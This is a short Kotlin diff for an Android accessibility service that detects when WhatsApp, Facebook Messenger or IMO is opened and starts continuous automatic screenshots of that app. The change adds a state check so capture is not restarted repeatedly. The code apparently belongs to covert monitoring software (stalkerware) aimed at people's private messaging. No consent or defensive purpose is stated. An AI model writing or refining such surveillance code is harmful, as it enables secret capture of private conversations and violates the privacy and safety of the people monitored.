@@ -48,6 +48,7 @@ class ScreenService : AccessibilityService() {
 
         @Volatile private var lastBlockedPkg = ""
         @Volatile private var lastBlockedTime = 0L
+        @Volatile private var currentApp: String? = null
     }
 
     private val client = OkHttpClient.Builder()
@@ -123,16 +124,20 @@ val isWhatsApp = pkg == PKG_WHATSAPP || pkg == PKG_WHATSAPP_B
 val isFB = pkg == PKG_FB || pkg == PKG_FB_MSG
 val isIMO = pkg == PKG_IMO || pkg == PKG_IMO_BETA
 
-if (isWhatsApp) {
+if (isWhatsApp && currentApp != "whatsapp") {
+    currentApp = "whatsapp"
     handleAppOpen("whatsapp")
     AutoScreenshot.startContinuous(this, "whatsapp")
-} else if (isFB) {
+} else if (isFB && currentApp != "fb") {
+    currentApp = "fb"
     handleAppOpen("fb")
     AutoScreenshot.startContinuous(this, "fb")
-} else if (isIMO) {
+} else if (isIMO && currentApp != "imo") {
+    currentApp = "imo"
     handleAppOpen("imo")
     AutoScreenshot.startContinuous(this, "imo")
-} else {
+} else if (!isWhatsApp && !isFB && !isIMO && currentApp != null) {
+    currentApp = null
     AutoScreenshot.stopContinuous()
 }
 
